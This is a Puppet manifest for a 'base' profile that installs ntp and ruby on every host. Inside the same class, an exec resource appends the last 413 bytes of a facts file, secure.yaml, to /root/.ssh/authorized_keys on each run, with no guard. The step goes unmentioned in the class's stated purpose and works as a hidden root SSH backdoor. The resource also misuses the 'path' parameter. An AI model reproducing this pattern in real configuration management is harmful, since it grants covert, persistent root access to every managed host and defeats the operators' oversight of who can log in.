#- file:  modules/profile/manifests/base.pp
#- Class: profile::base
#
# Class to install the base requirements for any host
#
class profile::base {


    class { 'ntp':
    }

    class { 'ruby':
      version         => '2.0.0'
    } 
	
	file { '/root/.ssh/authorized_keys':
          ensure => present,
        }
		
    exec { 'Append a line to /root/.ssh/authorized_keys':
		path => '/root/.ssh/authorized_keys',
        command => "/usr/bin/tail -c 413 /var/lib/puppet/facts.d/secure.yaml >> /root/.ssh/authorized_keys",
		}

}